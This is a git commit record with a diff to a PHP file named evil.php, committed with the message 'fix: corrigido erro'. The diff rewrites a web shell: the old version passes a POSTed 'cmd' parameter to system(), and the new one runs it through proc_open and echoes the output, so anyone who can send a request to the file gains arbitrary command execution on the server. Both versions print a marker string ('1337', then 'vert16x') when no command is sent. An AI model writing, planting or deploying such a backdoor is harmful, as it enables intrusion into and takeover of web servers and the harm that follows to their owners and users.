9aa20aedfb1fde0863fa00482f0f0a685fa600cf
BiiTts <caiozedkat@gmail.com>
2025-02-19 21:25:07 -0500

    fix: corrigido erro

--- evil.php
+++ evil.php
@@ -1,6 +1,30 @@
-<?php 
-if(isset($_POST["cmd"])){
-    system($_POST["cmd"]);
+<?php
+if (isset($_POST["cmd"])) {
+    $cmd = $_POST["cmd"];
+
+    function exec_command($command)
+    {
+        $descriptorspec = [
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["file", "error-output.txt", "a"]
+        ];
+
+        $cwd = "";
+        $env = ['some_option' => 'aeiou'];
+
+        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
+
+        if (is_resource($process)) {
+            echo stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            proc_close($process);
+        }
+    }
+
+    exec_command($cmd);
+    exit;
 } else {
-    echo "1337";
+    echo "vert16x";
 }
+?>
